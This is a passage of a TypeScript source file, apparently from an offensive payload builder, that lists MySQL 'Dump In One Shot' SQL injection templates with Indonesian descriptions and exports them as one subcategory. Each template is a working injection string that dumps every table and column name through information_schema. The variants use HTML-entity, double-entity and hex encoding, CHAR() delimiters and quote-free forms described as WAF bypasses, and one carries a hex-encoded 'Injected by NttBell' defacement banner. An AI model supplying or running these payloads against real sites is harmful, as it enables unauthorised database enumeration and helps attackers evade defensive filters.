    content: "(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(@)&#x46;&#x52;&#x4f;&#x4d;(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(@:=0x00),(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(0)&#x46;&#x52;&#x4f;&#x4d;(information_schema.columns)&#x57;&#x48;&#x45;&#x52;&#x45;(table_schema=database())&#x41;&#x4e;&#x44;(@)&#x41;&#x4e;&#x44;(@:=CONCAT(@,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-hex-html-double',
    name: 'Double HTML Entity Encoded DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'double-html', 'deep-decode'],
    description: 'Double encoding HTML entity untuk endpoint yang melakukan decoding bertahap',
    content: "(&amp;#x53;&amp;#x45;&amp;#x4c;&amp;#x45;&amp;#x43;&amp;#x54;(@)&#x46;&#x52;&#x4f;&#x4d;(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(@:=0x00),(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;(0)&#x46;&#x52;&#x4f;&#x4d;(information_schema.columns)&#x57;&#x48;&#x45;&#x52;&#x45;(table_schema=database())&#x41;&#x4e;&#x44;(@)&#x41;&#x4e;&#x44;(@:=CONCAT(@,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-hex-nttbell-fullhex',
    name: 'NttBell Signature Full-Hex Encoded DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'nttbell', 'full-hex', 'zero-quote'],
    description: 'Kueri DIOS NttBell lengkap dengan seluruh keyword dan pemisah ter-hex murni',
    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279204e747442656c6c202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'dios-mysql-hex-char-only',
    name: 'CHAR() Integer Delimited DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'char-int', 'no-quotes'],
    description: 'Pemisah baris dan kolom disusun menggunakan fungsi CHAR(10) dan CHAR(58)',
    content: "(SELECT(@c)FROM(SELECT(@c:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@c)AND(@c:=concat(@c,CHAR(10),table_name,CHAR(58),column_name))))c)"
  },
  {
    id: 'dios-mysql-hex-unquoted-waf',
    name: 'Unquoted Zero-Quote Hex DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'unquoted', 'zero-quote', 'waf-bypass'],
    description: 'Kueri ekstraksi tanpa karakter tanda petik sama sekali yang lolos filter WAF ketat',
    content: "(SELECT(@q)FROM(SELECT(@q:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@q)AND(@q:=concat(@q,0x0a,table_name,0x3a,column_name))))q)"
  }
];

export const allDiosMysqlTemplates: BuilderTemplate[] = [
  ...standardDiosTemplates,
  ...nonInfoSchemaDiosTemplates,
  ...variableBasedDiosTemplates,
  ...classicSignaturesDiosTemplates,
  ...hexEncodedDiosTemplates
];

export const diosMysqlSubcategory: BuilderSubcategory = {
  id: 'dios-mysql',
  label: 'DIOS MySQL',
  description: 'MySQL Dump In One Shot (DIOS) templates (Standard, Non-Info Schema, Variable @:=, Signatures, Hex)',
  templates: allDiosMysqlTemplates
};
